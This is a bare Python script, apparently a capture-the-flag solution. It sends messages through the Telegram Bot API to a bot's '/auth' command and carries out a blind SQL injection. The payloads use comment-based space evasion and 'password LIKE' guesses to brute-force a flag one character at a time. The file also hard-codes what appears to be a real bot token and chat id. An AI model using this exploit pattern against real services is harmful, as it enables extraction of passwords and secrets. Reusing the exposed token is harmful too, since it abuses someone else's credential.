import requests

chat_id = 1979410244
BOT_TOKEN = "6493149597:AAEqLsFYs7f_sokco_xcZIc6OIBoiok0DLo"


URL = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'

payload = {
    'chat_id': chat_id,
    'text': "hello world"
}


response = requests.post(URL, json=payload)

flag = "ingeneer{s3c"

payload = f'/auth 123"/*\*/or/*\*/password/*\*/LIKE/*\*/"{flag}%"-- 123'

chars = "abcdefghijklmnopqrstuvwxyz0123456789_}"

for c in chars:
    payload = f'/auth 123"/*\*/or/*\*/password/*\*/LIKE/*\*/"{flag}{c}%"-- 123'
    payload = {
        'chat_id': chat_id,
        'text': payload
    }
    response = requests.post(URL, json=payload)
